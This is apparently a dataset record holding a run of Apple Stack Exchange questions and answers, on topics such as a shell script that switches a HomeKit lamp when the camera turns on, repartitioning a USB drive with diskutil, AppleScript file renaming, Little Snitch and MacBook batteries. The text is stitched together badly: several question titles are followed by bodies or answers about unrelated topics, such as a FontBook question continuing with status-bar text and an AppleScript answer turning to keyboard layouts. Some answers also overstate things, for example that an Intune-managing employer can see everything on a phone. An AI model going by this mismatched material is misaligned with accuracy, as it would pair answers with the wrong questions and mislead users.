\"$event\" = \"start\" ]; then\n      echo \"Lamp on\"\n      shortcuts run 'Desk lamp on' &\n    else\n      echo \"Lamp off\"\n      shortcuts run 'Desk lamp off' &\n    fi\n  done\n\nReplace my shortcut names Desk lamp on and Desk lamp off with your own, if different. Feel free to alter messages like \"Lamp on\" to fit your scenario.\nIf you needed to choose a different filter in step 1:\n\n*\n\n*replace the grep regular expression with one that matches both your camera on and camera off event log messages,\n\n*replace the sed substitution regular expression with one that matches the equivalent word that indicates the camera state, and\n\n*if that word is not start when the camera turns on, update the if conditional that matches the start word.\n\nRun the script\nRun the script, and test it out. If you named it camera-lamp.sh, run\nbash camera-lamp.sh\n\nWhile the script is running, your HomeKit shortcuts should trigger whenever your camera turns on or off.\nOptional steps:\n\n*\n\n*Once the script is stable, run it in the background, and close the terminal.\nbash camera-lamp.sh &\n\n\n\n*Drop the extension, make the file executable, and relocate it to /usr/local/bin or elsewhere in your $PATH, so you can just run camera-lamp as a command.\n\n\n*Find a way to run the script in the background as a daemon on login. How to accomplish this is beyond the scope of this answer. Importantly though, this cannot run as a launchctl daemon, as these daemons cannot run shortcuts due to Error: Couldn’t communicate with a helper application. If you find a good approach, feel free to comment.\nUpdate\nIf you use log's internal filtering instead of grep, CPU usage will decrease, per @alloy's comment.\n#!/bin/bash\nexec log stream --predicate 'process == \"UVCAssistant\" && (eventMessage CONTAINS \"start stream\" || eventMessage CONTAINS \"Stop Stream\")' |\n  /usr/bin/grep -vE --line-buffered '^Filter' | # filter out the informational output at launch\n  tee /dev/stderr |                             # output matching events for debugging\n  /usr/bin/sed -Eu 's/.*(start|stop).*/\\1/' |   # reduce the log message down to a single word identifying the event/state\n  while read -r event; do                       # store that word in the $event variable\n    echo \"Camera $event\"\n    if [ \"$event\" = \"start\" ]; then\n      echo \"Lamp on\"\n      shortcuts run 'Desk lamp on' &\n    else\n      echo \"Lamp off\"\n      shortcuts run 'Desk lamp off' &\n    fi\n  done\n\nSee https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/Predicates/Articles/pSyntax.html for log's predicate syntax.\n\nA: It doesn't seem possible to do this with HomeKit, but it is possible to make a script that communicates with IFTTT, and IFTTT will communicate with Hue directly. If you have a Hubitat hub or Home assistant that will also work as a webhook-in-the-middle.\nI got through the first part easily: getting a push when camera is opened or closed. To detect camera on:\nwhile true; do log stream | grep -o -m 1 \"Post event kCameraStreamStop\" > /dev/null && echo STOPPED; done\n\nAnd camera off:\nwhile true; do log stream | grep -o -m 1 \"Post event kCameraStreamStart\" > /dev/null && echo STARTED; done\n\nThese can be easily converted into a silent, single script that launches at startup. To communicate with the bulbs, we will replace \"echo STARTED/STOPPED\" with curl to an IFTTT webhook. So you need to make an IFTTT account (If you have used up more than one of your 3 free rules, create another account unless you're paying for premium already), and link up Hue with a webhook. Curl will call this webhook and set your hue bulb to whatever color, Kelvin, and brightness you want or turn it off. If you need more specific guidance then I can help you.\n", "Q: Prevent iCloud Drive From Auto-Downloading on Mac Is there a way to stop the auto-downloading of files in iCloud Drive on Mac, and if so, how? I want the files synced with iCloud Drive, but I don’t want all the files automatically downloaded. I also don’t want to have to completely turn off iCloud Drive on my Mac to prevent this behavior obviously. I don’t know why it auto-downloads files uploaded to iCloud Drive on the Mac, but not the iPhone. This behavior is really annoying especially when you only have a 128GB Mac and you have to constantly manually remove the downloaded files. Any tips on what to do here would be appreciated.\n\nA: The short answer is no, iCloud Drive will try and download the complete iCloud contents. Unlike Dropbox you can't be selective about what is synced. The suggested link from @DavidSupportsMonica suggests not ticking \"Optimise Mac Storage\". I think this is good advice as you can then manage space in iCloud and your Mac independently.\n", "Q: How can I delete the partition table on a USB flash drive? I have a 32Gb USB flash drive, and I flashed it with a bootable image. So, that process modified the partition table, and the drive now reports a size of 1Gb. Unfortunately, erasing or reformatting the drive doesn't fix it. From what I've read, I need to completely nuke the partition table. Usually, this would be very easy to do on a Linux machine, but I must do it on a Mac right now. The Disk Utility app doesn't seem to have an UI for this. Is there another tool or set of commands I could use?\nmacOS Big Sur 11.3.1\n\nA: Since some recent version of macOS (High Sierra? more precision needed here), Disk Utility stopped presenting by default physical devices. Thus users are protected against erasing their disks by error. I would say that MacOS is evolving to hide more and more risky functions to protect users (which is easier than to teach them the truth).\nTo recover the usual vision of devices and volumes, one has simply to open the left top View menu and select Show All Devices. In fact this Show All Devices will show all physical devices (disks, USB flash drives, SSD…) but not truly all volumes.\nFrom there, you will see that actually your drive wasn't shrunk, but just the unique volume on it was defined to be 1 GB.\nBy fully erasing your physical drive, you will destroy its actual partition and create a new volume of 32 GB.\n\nA: Like this\n// find the path to the usb\ndiskutil list\n\n// delete the partition and reformat\ndiskutil partitionDisk <YOUR-USB-DEV-PATH> MBR MS-DOS FAT32 100%\n\nexample\ndiskutil partitionDisk /dev/disk2 MBR MS-DOS FAT32 100%\n\n", "Q: In FontBook, how do I re-enable the \"...Remove Font Family?\" warning?

I always look for it at the bottom of the window, but I find it at the top.\n\nVarious images on the Web with instructions for showing the status bar also show it at the bottom.\n\nA: I think this is something that's got forgotten about over the years. It's 'interactive' but not really in a good way.\nIf you disable the Toolbar, this also disables the Sidebar & pushes the Status Bar to the top. Whilst set like this, View Sidebar is greyed out.\n\nRe-enabling the Toolbar drops it back to the bottom & brings back the Sidebar if it was previously enabled.\n\nPictures from Mojave, but it's been this way for years.\nI just realised, you appear to have managed a hybrid view. You have the Sidebar but not the Toolbar. I cannot repro this on Big Sur, Mojave, El Capitan… or even Snow Leopard.\n", "Q: AppleScript extract before delimiter from result of shell script I would like to extract name from text list. \nResult from do shell shell command:\nset Clist to do shell command \"ls ./\"\n\nIs:\nJohn_01044445558_pass.jpg<br>\nJane_01044562738_visa.jpg<br>\nDoe_01027381938_pass.jpg<br>\nJoe_7485.jpg\n\nI need John Jane Doe Joe from that list in this format:\nJohn, Jane, Doe, Joe\n\nHow can I achieve this?\nHere is Full script.\ntell application \"Finder\"\nset fullname to name of (selection as alias)\nset Cdate to do shell script \"date '+%Y.%m.%d'\"\nset AppleScript's text item delimiters to {\"_\"}\nif fullname contains \".jpg\" then\n    set CnameNFD to first text item of fullname\n    set Cmobile to second text item of fullname\n    set Ccustomer to second text item of fullname\n    set Ctemp to \"/Volumes/homes/macbook/Save/\"\n    set Clink to \"https://r.loyverse.com/dashboard/#/clients/database?page=0&limit=10&search=\"\n    set Cname to ¬\n        do shell script \"echo \" & (CnameNFD as text) & \"|iconv -f UTF-8-MAC -t UTF-8\"\n    --Save폴더에서 전화번호로 검색된리스트를 이름만 가져옴\n    --      set Cppl to do shell script \"Ctemp=\" & Ctemp & \" Cmobile=\" & Cmobile & \";ls $Ctemp | grep $Cmobile | awk -F'_' '{print $1}' \"\n    set Cppl to do shell script \"Ctemp=\" & Ctemp & \" Cmobile=\" & Cmobile & \";ls $Ctemp | grep $Cmobile \"\n    set lsOutputAsList to ¬\n        paragraphs of ¬\n        Cppl\n    set theNamesList to {}\n    repeat with thisItem in lsOutputAsList\n        copy first text item of thisItem ¬\n            to the end of theNamesList\n    end repeat\n    set AppleScript's text item delimiters to \", \"\n    set theNames to theNamesList as text\n    set AppleScript's text item delimiters to {\"\"}\n    do shell script \"Cname=\" & Cname & \" Cmobile=\" & Cmobile & \" Ccustomer=\" & Ccustomer & \" theNames=\" & theNames & \"; echo \\\"'$theNames'\\\"\"\n\nelse\ndisplay dialog \"올바른 파일을 선택하십시오.\" buttons {\"Okay\"} default button 1\nend if\nend tell\nIf I display dialog theNames it shows as I expected.\nBut I run with shell script echo theNames it shows nothing.\nI need to use theNames variable to curl post.\n\nA: \nI need John Jane Doe Joe from that list in this format.

(We all think the US is wrong… it's simply a matter of perspective ;)\nSimply changing the input language does not, in itself, change the fact that key is recognised correctly as being an ISO keyboard, so some active remapping is going to be needed.\nBTW, Ukelele doesn't 'run as an app' once you've finished building your new layout. It just aids in building the layout, which is then accessed like any other.\nThere's an alternative idea, untested…\nSystem Prefs > Keyboard > Keyboard > Change keyboard type\nWhen it gets to the part that tells you to press the key immediately to the right of left shift… press the z key instead of tilde.

I am a newbie to Little Snitch, and am unfamiliar with what I am seeing.\nOne thing that troubles me is an arc on the map display from the windward islands that says \"Private Network.\"\nIt is certainly eyeopening to see how many information exchanges take place which I was previously oblivious to. It is easy to get paranoid because I don't have the context.\nSo I am asking the community if this private network is something I should be concerned about, i.e. a MITM hack, or is it normal?\n\nA: It's perfectly normal to have a \"Private Network\", yes.\n\"Private Network\" in terms of Little Snitch means that the communication has occurred between network addresses that are usually not routed on the internet. This means that the private network is usually either devices on your local network (i.e. in your own house for example), or devices on a private network you connect to (for example a work VPN with servers that have these addresses).\nIn general, there's nothing particularly \"worrying\" about private networks. There's no reason to be paranoid.\nWhether or not the actual traffic is benign or malicious requires further analysis. You would need to know more about the specific communication, the devices on your local network and any other private networks you connect to.\nAs this type of knowledge is harder to come by for non-IT professional home users, it can be that Little Snitch itself becomes a source of needless worry - unfortunately.\n", "Q: How do desktop stacks detect screenshots?

Can I just copy Backups.backupdb to another HFS drive, then copy it back to the new APFS drive, via Finder? (With TM turned off of course.)\nAlso, my current Backups.backupdb contains backups from 2 machines. I only need to preserve the backups for 1 of them. Can I copy just that subfolder?\n(macOS Catalina)\n\nA: You cannot preserve the backups while upgrading the disk to APFS. The structure of the backups are fundamentally different and incompatible.\n", "Q: Show month calendar in date time dropdown in OSX?

Is it possible to duplicate a remote session in macos terminal?\nI want to clone this session without having to connect to the remote host again, so I have two tabs for working expediently.\n\n\nA: Each Terminal tab has its own shell and its own connection to a remote server, that can't be easily duplicated.\nBut you can use a terminal multiplexer like tmux for this which will run on the remote server. It will not give you a new Terminal window, but you can switch between virtual terminals inside one window/tab, all within one remote login.\nIf you are using iterm2 there is tmux integration.\n", "Q: Unable to allocate free space at end of disk to Mac As per screenshot below, my Mac has 1TB storage, but the actual capacity shown in Disk Utility only 816GB.

I have installed Windows 7 SP1 via Boot Camp and a bootable disk. It was working fine.\nSo the other day, I decided to create a new partition on Windows using Windows 7 SP1 and it did warn me that I can only boot an OS from this partition. It did create a new partition (usable). I then checked the Boot Camp help system and it said that there was only 1 startup disk I could use, which is labeled Windows. And that is how I know i have made a big mistake. The following day I proceeded to hold down the option key while starting the iMac and normally it would show 3 options: Windows, macOS 10.13.6 and Recovery 10.13.6. (I am not sure about the names.) But, now it only shows the Windows option. So, I then restart my mac into Internet Recovery mode and it just stuck at ETA 24:00. It wont even move after 1 hour, and it gives me an exclamation mark in a triangle over the globe. Can you guys help me fix this please.

Things are separated.\n\n*Inventory Device of the company (DEP enrolled MDM device): Can I use a private iCloud-Account on such device and data is separated like it's my own private property and because of it's a corporate device, they have a bit more rights things to do with it (wiping and so on) except of accessing my personal data?\n\nWould be really helpful to know, can't find specific information about it.\nThank you!\n\nA: If it’s a company owned device and it has Microsoft InTune installed as the MDM your employer can see everything on the phone. If it’s your personal phone and you installed InTune to be able to access certain work stuff then they can still see everything by flipping a switch on their dashboard which switches the phone status from personal to company owned. This is so invasive that there are usually rules enforced by the threat of termination that prevent this from happening. But it can happen. InTune even gives itself more rights than Apple do in that if an officer of the law approaches your company and asks for access to the phone, a sympathetic company officer, or just someone who doesn’t like you can give them access.

Running macOS Big Sur 11.4\nSo, I am ancient, and I still use Stickies.  Like, a lot.  It's pretty clutch for me for a large number of reasons.  But, there's one annoyance that has shown up recently:\nEvery time I launch Stickies, it clutters my Apple Menu's Recent Documents list with a .rtfd file for each individual sticky note.  Ack!!!  I have a lot of sticky notes, so this has effectively rendered my  > Recent Documents list completely useless.

Can I deny Stickies.app permission to populate the recent documents list somehow, without jettisoning the menu entirely?\n\nA: You could check out SideNotes. It doesn’t add anything to the recents menu. It's much more convenient.\n", "Q: Is it a battery problem or SMC problem? I have a mid-2015 MacBook Pro running High Sierra.

Even if it isn't flagging the 'Needs Servicing' flag, it's six years old, draining rapidly, with a diminished capacity.\n80% of original capacity is Apple's threshold to replace the battery. If it's under warranty, they'll do it for free. If not (and yours isn't), you'll have to pay.\nIf the capacity is much higher, they'll tell you it's fine and to come back when it's lost a bit more!\nIt's around $200, but the good news is that because of the design, they actually replace the entire 'top half' - the keyboard, trackpad and upper case. So it's a pretty good investment to prolong the life of your Mac.\n\nA: Your battery is rather old ( ~ 3.5 years ) and had a rather very small cycle count ( ~ 30 ). Then its high level of charge slowly decreased.\nI suggest you to fully discharge your battery in one pass.\nUnplug your Mac, and let it go to the point where it will make a forced shutdown or switch on hybernate mode. See pmset -g | grep hibernate. When you reach the 5 % level, take care to save any\nopen file, and even better, close any open application.\nNext fully charge it in one pass and to its max charge reachable. Check again the output of coconutBattery.\nIf its current charge is pretty near 80% again, then you should\nplanify your battery replacement.\nYou don't have to tinker with the SMC ( this is rather a religious trick from bad guys working in support and who respect\nprocedures rather than analyzing problems ). Many users who apply this reset of the SMC conclude it fixed their problem when in fact in the cases I throughly checked it is just the reboot of MacOS which fixed it.\n", "Q: Safari downloads files to last opened folder Although Safari has a setting for a default download folder, it always defaults to the last folder I uploaded something from when downloading via \"save as\". This is very annoying for obvious reasons: I rarely want to download something to the last opened folder and I rarely remember what that folder was. Is there a way to make it not do this?\n\nA: I think the whole idea is that any Save is to Downloads, any Save as… is to the folder of your choice - that by default is the last place you used.\nI guess this means that saving an image or a linked file always gives you the choice, but saving a page as webarchive doesn't.\nI could recommend Default Folder X, which I've had on every Mac I've owned since before they added the X. Amongst other things, it remembers a list of favourites & recents , plus you can click through any app in the way to any open folder on the desktop [even if it's in a different Space, if you set that pref].\n\nA: Files that are automatically downloaded should go directly to the Downloads folder.\nYou can also right-click on a link, and select \"Download Linked File\", which will also go directly to the Downloads folder. Selecting \"Download Linked File As\" will bring up a file dialog.\n\nRight-clicking on an image will bring up a similar contextual menu.\n\n\"Save Image To Downloads\" will obviously go directly to the Downloads folder; \"Save Image As...\" will bring up a file dialog.\nIf you're using Save As from the File menu, then that is for web pages (or archives of a web page), and that will bring up a file dialog.\nIn all cases where a file dialog appears, you should be able to see the default location, and navigate somewhere else if it's not what you want.\nYou should see the Finder 'Sidebar' in the file dialog, where you can select the Downloads folder.\n", "Q: No folder permission options/lock icon in macOS Catalina On a 2018 Mac mini that came pre-loaded with macOS Catalina, when I get info on a folder, under \"Sharing & Permissions\" it only displays \"You can read and write\" but there are none of the standard read/write columns nor any lock icon like in previous versions.\nWhat am I missing? Am I not logged in as administrator? I've never encountered this before.\n\nA: The permissions you see will depend how the drive is formatted.\nIf it's HFS+ or APFS, on any non-boot drive, you should see a line at the bottom of the Get Info window marked \"ignore ownership on this volume'. If it's NTFS this will be missing.

It's a great step in the right direction that iOS 14.7.1 now forces apps to let the user know that it's tracking their activity, with a prompt such as this:\n\nIt says:\n\nTrack your activity across other companies' apps and websites\n\nwhich is vague, and doesn't state what 'Allow' actually gives the app access to. For example, I am not sure if it will grant the app access to:\n\n*\n\n*All Safari activity?\n\n*Search history and activity on other browsers (e.g. chrome)?\n\n*Activity on the current device only, or all devices?\n\n*All other apps on that device, or just some? (and if it's a subset, can I look up which ones?)\n\n*Past activity (e.g. search history), or just future activity?\n\nPublicly available information is also vague\n\n*\n\n*The Apple website page 'About iOS 14 Updates' states:\n\n\nApp Tracking Transparency lets you control which apps are allowed to track your activity across other companies' apps and websites for ads or sharing with data brokers\n\nand\n\nand App Tracking Transparency lets you control which apps are allowed to track your activity across other companies' apps and websites\n\nthis also does not give precise delineation between what is being allowed and not allowed.\n\n*\n\n*Apple's page on (if) an app asks to track your activity states:\n\n\nTracking occurs when information that identifies you or your device collected from an app is linked with information that identifies you or your device collected on apps, websites and other locations owned by third parties for the purposes of targeted advertising or advertising measurement, or when the information collected is shared with data brokers.\n\nand links to a privacy info page that states:\n\nincluding location, contact info, health info and more\n\nBut it too doesn't mention how to find which apps this prompt gives an app permission to share with, nor whether it allows sharing of all browser activity or just the activity on third party websites which share trackers with the app in question.\n\nA: This gives the unique identifier of your device to the app. For example, apps could sell your usage patterns linked with the ID to a database, and advertisers can use these patterns to advertise relevant ads to this specific device. Blocking this is generally good, since it allows you to prevent more personalized data to be sent to data collectors and advertisers. Some companies, such as google (if you don’t have a google account), have gotten around this by using your usage patterns as your identifier itself (since there AI is so sophisticated).\n", "Q: Is MacBook able to turn on the isight camera even the green light indicator is burned or damaged? I am referring to the URL below stated that no software able to bypass or turn off the light not even the macos firmwares.\nDoes a modern MacBook's green \"camera light\" always turn on when the camera is activated?\nI wonder what if my Mac book Pro green light indicator is damaged or burned, will the iSight camera still able to be activated?\n\nA: The light is in series with the camera, so the camera will only turn on if the circuit is unbroken.\nIt may be possible for the light to be broken but still pass electrical current through it.\nThe only real way to know is to test it. I wouldn't advise deliberately trying to damage the light in order to turn it off.\n", "Q: What's the difference between an \"eSIM\" and a \"Digital SIM\"? I thought that ESIM and Digital SIM were the same thing, to be distinguished from a physical SIM. However, my iPhone SE shows that I have an ESIM and a Digital SIM, and they have different IMEI numbers.\n\nIn the past, I think I remember that this used to show a section for what it called a \"Physical SIM\" but I think that section was replaced with what now says \"Digital SIM\". This was after changing SIM cards, carriers, and updating the APN settings.\n\nA: An eSIM can be thought of as a type of digital SIM.\nYou can store multiple eSIMs on a phone, and thus have several listings of them (only one can be activated at the same time though).\nThe digital SIM listing is there even when you have no eSIMs installed. When you have 1 eSIM installed, you'll see both the basic capability of digital SIM shown as well as the actual eSIM.\nSo all in all this is perfectly normal.\n", "Q: Non-sudo alternatives to get the current time zone? sudo systemsetup -gettimezone will return the current system set time zone to the command line but it requires sudo.\ndate \"+%z\" will return the offset (e.g. +0900) and date \"+%Z\" will return the time zone short code (e.g. JST).\nIs there another way, either command, executable or API? My searches have turned up nothing. I'm writing a CLI terminal program (not Objective-C/Swift) within which it would be helpful to have access to whatever the system currently is set to.\nAny help or insight will be much appreciated.\n\nA: /etc/localtime is a symlink pointing to the currently used timezone.

The method date(1) uses. You can read the source (freely available), you note the method it uses, you use it in your own program.\nReading the source for date(1) leads to it using the library function fprintftime() in function show_date() which leads to the generic strftime().\nhttps://pubs.opengroup.org/onlinepubs/9699919799/functions/strftime.html\n", "Q: Preventing macOS Big Sur from automatically swtiching to Bluetooth audio device output I have a bluetooth headset that I use for an Android phone and a MacBook. It has the feature of being able to connect to both at the same time, and switch to whichever one is actively playing. There is no mixing, the audio is just \"stolen\".\nHowever, when some audio applications idle, they will \"steal\" the audio. So, if I'm using my phone, and the MacBook will come into range while Spotify is open (but not playing) it will pause playback on the phone and switch to the MacBook. This is because once the headset is in range, macOS automatically connects to it and then switches the default audio device to it.\nSo far in Big Sur I've not found an option to disable it. This question has a solution that works for previous versions but not Big Sur.\nIt will even switch audio devices if I have wired headphones connected!\nIs there some workaround I can use for Big Sur?\n\nA: To turn off automatic switching, you will need to be on the device your AirPods are currently connected to.\nInstructions for an iPhone or iPad\n\n*\n\n*Open the Settings app, and select Bluetooth\n\n\n*Tap the Info icon next to your AirPods, and look for Connect to This [Device]\n\n\n*Change the connection option to When Last Connected to This [Device]\nInstructions for a Mac\n\n*\n\n*Open the System Preferences application.\n\n\n*Select Bluetooth and then choose Options next to your AirPods.\n\n\n*Next to Connect to This Mac choose When Last Connected to This Mac\n\n\n*When this option is selected, your AirPods will automatically connect to the last device they were manually connected to, and will not switch to another device on their own.\nOne important thing to note: You will need to take the above steps on each of your devices, or at least the devices you don’t want your AirPods to automatically switch to. For example, you may want your AirPods to automatically switch to your iPhone, but not your Mac. In that case, you would need to take the above steps for your Mac, but leave automatic switching enabled on your iPhone.\n", "Q: Renaming files sequentially from folder name with Automator Asked previously about renaming files in a folder (Rename File(s) from Foldername using automator/AppleScript), and now I have a folder flow that almost works.\nI have created a folder in my Downloads called DOIT (As per attachments and workflow screenshots).\nI drop a folder in there called \"Race Track 2019\" which has a few random filenames in.\nWhat I want is to rename the files sequentially from the folder name. I have the folder name variable working (as per screenshots) but it won't rename the files.\nI was after (in this example) to be left with 2 files called \"Race Track 2019-1 and Race Track 2019-2\"\n\n\n\nA: Using Automator for the Folder Action\nIn the Automator Folder Action image further below in this answer, pay attention to the Automator actions and their settings. In particular, the Options set on the Get Value of Variable action has [√] Ignore this action's input checked.\nThe first action, Set Value of Variable, is set to IncomingFolder and gets filtered in a Filter Finder Items action so as to get just the folder itself in order to use a Run Shell Script action to ascertain its name and assign it to the FolderName variable in the Set Value of Variable action.\nThere needs to be a logical break between this Set Value of Variable action and the ensuing Get Value of Variable action so as to then filter out the folder(s) as it's the files that will be renamed, not the folder(s).\nThe image shown further below in this answer is of the actual working Automator Folder Action and why there is no Get Selected Finder Items action nor and green circle check marks, as it is run in the background when the Race Track 2019 folder is dropped into the DOIT folder.\nIn my testing:\nRace Track 2019\n├── cb4d4gdc.jpg\n└── nn49494.jpg\n\nBecame:\nRace Track 2019\n├── Race Track 2019-1.jpg\n└── Race Track 2019-2.jpg\n\n\n\nUsing an AppleScript script for the Folder Action\nHere is another approach that uses an AppleScript script for the Folder Action.\nOne of its benefits is it can handle multiple folders being dropped at the same time into the target folder of the Folder Action.\nUsing Script Editor, save the example AppleScript code  to ~/Library/Scripts/Folder Action Scripts and use Folder Action Setup to assign it to the target folder.\n\nExample AppleScript code:\non adding folder items to thisFolder after receiving theseNewItems\n    tell application \"Finder\"\n        repeat with thisItem in theseNewItems\n            set thisItemsProperties to properties of thisItem\n            if class of thisItemsProperties is folder then\n                set folderName to name of thisItemsProperties\n                set theseFiles to files of entire contents of thisItem\n                repeat with i from 1 to count theseFiles\n                    set name of item i of theseFiles to ¬\n                        folderName & \"-\" & i & \".\" & ¬\n                        name extension of item i of theseFiles\n                end repeat\n            end if\n        end repeat\n    end tell\nend adding folder items to\n\nNotes:\nThe example AppleScript code, as coded, assumes files to be renamed have an extension. If you need to act on files not having an extension, then the example AppleScript code will need to be modified to accommodate that condition.\n\n\nScreenshot of Automator Folder Action\nNote: This Automator Folder Action is designed to receive a single folder at a time!\nDropping multiple folders will result in the all files having the name of the first folder dropped!\nFor multiple folders, see: Using an AppleScript script for the Folder Action\n\n\n\nAs an Automator Service/Quick Action for Finder\nIf you'd like you be able to select folders in Finder and have the files within renamed, then create an Automator Service/Quick Action with the settings as shown in the image of the Automator Service/Quick Action below, adding a Run AppleScript action with the example AppleScript code.\nExample AppleScript code:\non run {input, parameters}\n    \n    tell application \"Finder\"\n        repeat with thisItem in input\n            set folderName to name of thisItem\n            set theseFiles to files of entire contents of thisItem\n            repeat with i from 1 to count theseFiles\n                set name of item i of theseFiles to ¬\n                    folderName & \"-\" & i & \".\" & ¬\n                    name extension of item i of theseFiles\n            end repeat\n        end repeat\n    end tell\n    \nend run\n\nNotes:\nThe example AppleScript code, as coded, assumes files to be renamed have an extension. If you need to act on files not having an extension, then the example AppleScript code will need to be modified to accommodate that condition.\n\n\n\nNote: The example AppleScript code is just that and sans any included error handling does not contain any additional error handling as may be appropriate. The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide. See also, Working with Errors. Additionally, the use of the delay command may be necessary between events where appropriate, e.g. delay 0.5, with the value of the delay set appropriately.\n\nA: Fun fact - if you do this slightly wrong in Automator, you can end up renaming every file on your computer. I might have done it more than slightly wrong, but (if I ever finish reinstalling my OS) I don't think I'll test my theory.\n", "Q: MacBook showing battery service required no longer turns on after sleep I got a MacBook Pro 2016 at the office. It was working great however the battery kept saying it needed to be serviced and wasn't really good at holding charge either. 100% would reach ~60% in 30 mins. But I didn’t mind as I am mostly plugged in anyway.\nThen I brought it home, used it and didn’t shut it down but rather clicked the power button (which I presume is standby), closed the lid and put it on the shelf.\nIn the morning I try to turn it on and nothing! It's not turning on. I kept it charging for hours but still no response. Tried the SMC reset but nothing. I am suspecting it's because of the battery but what are your thoughts?\n\nA: You know that, at the very least, the battery needs replacing. There could also be a problem with the power unit. However, hardware problems are best diagnosed in the presence of the machine itself. Take it to an Apple Store, or other Apple-authorised technician.\n(Unless, when you say you 'got it at the office', it's the property and responsibility of your employer: in which case you should return it to them.)\nA technician will be able to confirm what needs doing, and how much it will cost, leaving you to decide whether that's worthwhile. If you got it very cheap from office surplus, then a few hundred dollars (or equivalent) would be worth it, IMO.\n", "Q: Few doubts about \"Apple USB-C Charge Cable (2 m)\" Apple USB-C Charge Cable (2 m)\n\n*\n\n*Is it a Thunderbolt 3 cable?\n\n*Which USB version this cable is using?\n\n*Is it the same cable which comes with new MacBooks?\n\n\nA: No, it's not a Thunderbolt cable. Although they have the same shape connectors, they are different things. You can tell by the icon on the plug whether a cable is TB or USB.\nAs for the version, that's more complex. Apple don't specify it on their page. This webpage https://9to5mac.com/2018/08/22/how-to-choose-a-usb-c-cable/ suggests that products called \"charge cables\" may have low data transfer speeds, and you may be better off getting a quality third-party USB-C cable that can handle USB3.1 SuperSpeed, if that's what you need.\nLook for the correct \"SuperSpeed\" icon on the end of the plug.\nIt probably is the same cable that comes with a new Mac, but really you'll need to compare them.\n\nA: \nIs it a Thunderbolt 3 cable?\n\nNo.\n\nWhich USB version this cable is using?\n\nUSB 2.0.\n\nIs it the same cable which comes with new MacBooks?\n\nYes.\nThe cable is rated for 20 volt power at 5 amps, suitable to connect any Apple iProduct with USB-C charging to a power brick.  Apple calls it a \"charge only\" cable but it will support USB 2.0 data transfer which should do well enough for small file transfers and such, or as a means to connect a backup drive or something when nothing else is available.\nPassive Thunderbolt 3 cables will be less than a meter long, but then so are some low cost \"charge only\" cables.  If you are looking for a Thunderbolt cable then expect it to be short: https://www.apple.com/shop/product/MQ4H2AM/A/thunderbolt-3-usb%E2%80%91c-cable-08-m\nOr expensive: https://www.apple.com/shop/product/ML8E3AM/A/thunderbolt-3-pro-cable-2-m\nAnother expensive example: https://www.apple.com/shop/product/HMBH2ZM/A/belkin-thunderbolt-3-5a-cable-2-m\n", "Q: Can I use a 3rd party GPL2+/LGPL2+ library in an MPL 2 licenced iOS app? I'm thinking of using libmpv to provide video playback in my MPL 2 Flutter app. I know that Apple is weird about GPL stuff (and using GPL stuff in a greater work is awkward), so I was just wondering if I was actually allowed to.\nHere's the source code if it matters: https://github.com/UnicornsOnLSD/finamp\n\nA: Apple does not really come into the equation here. There are no rules stating that you must specific open source licenses or anything like that.\nIn order to publish app on the App Store you need to have properly licensed code. It doesn't matter which license it is as such, you just need to have the rights to use the code in the manner you're choosing to do so.\nIf you want to know about combining (L)GPL code with MPL code in general, you can find a very thorough and practical set of instructions here:\nhttps://www.mozilla.org/en-US/MPL/2.0/combining-mpl-and-gpl/\n", "Q: Is it true that Apple won't allow users to download full resolution photos from iCloud Photo to Windows computers? I have a subscription to the 50GB iCloud Photos. It contains 50GB of my photos. I hope to back up these photos to my Windows laptop. I've downloaded iCloud for Windows and synced the photos from iCloud Photos to my Windows laptop. However, I notice a big discrepancy between the total size of the photos I downloaded and the total size of the photos on iCloud (32GB on my Windows laptop vs 50GB on iCloud). I contacted Apple Customer Support and reached a very arrogant rep. He told me that there's no way to backup the full resolution version to a PC. I need to buy a Mac to do that. Is that a nefarious sticky feature Apple uses to keep people on its ecosystem?\n\nA: The iCloud for Windows app downloads the ‘most compatible’ version of the photo, which is a compressed JPEG capped to roughly 4 MP, as Windows does not by default support HEIF.\nYou can download the original quality from iCloud.com/photos as HEIF, by selecting some photos and choosing the down arrow at the bottom-right of the download button and choosing Unmodified Original.\n\nGet HEIF Image Extensions by Microsoft on the Windows Store to view HEIC photos and HEVC video on Windows 10.\nmacOS Photos app always uses the original quality with macOS built-in support for HEIF.\n\nA: and there's this HEIC to JPEG converter from iMazing to get those 50 GB of photos to the right format.\n", "Q: Is there a way to geofence (block) iPhone data usage? I am trying to figure out a way to block data usage when an iPhone is in a certain location, specifically, my home.\nThe use case is this: The phone is my child's. The phone uses WiFi at home. The WiFi network is blocked (by me) at the router level until responsibilities are taken care of (homework, etc.). But when WiFi is not available, the phone just uses the data network. This both subverts the screen time management plan, and eats up the device's monthly data limit (necessary to prevent absurd cell phone bills). I'm looking for a solution that doesn't involve physically taking the phone away.\nSolutions could involve:\n\n*\n\n*iPhone settings (seems easiest to me, if there is a way to do it)\n\n*Parental control software/apps such as NetNanny or Qustodio\n\n*Carrier-level settings--in which case I can provide information about my carrier, though I'm not sure that carriers provide geofencing\n\n\nA: You can use the Shortcuts app to create a shortcut that turns cellphone data on or off at a certain time, or when a text from you which contains a specific word is received, plus several other triggers.\n", "Q: Can apple mail on iOS be used to configure server-side rules on exchange server When using an Exchange mailbox, Exchange supports server-side rules to filter and sort mails automatically.

In System Preferences, when I say I want a new Google account, I get a dialog that says\n\nGoogle requires completing authentication in your web browser\n\nSo I click the button and immediately I see another dialog\n\nFailed to authenticate with Google, please try again later\n\nThere is no evident communication with the browser, so I can't authenticate. I've also tried creating a normal manual mail account, but no better luck.\nI have turned on Less Secure App Access for the account I want to use.

This one is Catalina 10.15.7.\n\nA: I was able to resolve the same issue by restarting the computer in safe mode and then adding the account as a Google account in the Internet Accounts prefpane. It opened the browser window and allowed me to authenticate.\nNow that I've restarted out of safe mode the account is still working, and adding new accounts appears to be working again too. I have no idea why though!\n\nA: This answer is likely not going to be useful, but the problem just mysteriously fixed itself. In Internet Accounts pref pane, I created a new account with Add Other Account (not Google), entered the information, and the account sprang to life successfully. I have no idea why.\nAll of this has something to do, I'm pretty sure, with the new use of OAuth by Google. Maybe it sometimes just doesn't work at the server end. I came into the process this time armed with the concept \"OAuth\" in my head, but unless the computer (or Google) was reading my mind, it was never actually used during setup.\nIt is interesting that, peeking into Keychain Access, on my Big Sur machine, my google accounts have OAuth entries, but my Catalina keychain has no such entries. This makes me think that Catalina just doesn't really understand OAuth, even when updated to the latest version.\n", "Q: List of free Finder shortcuts?

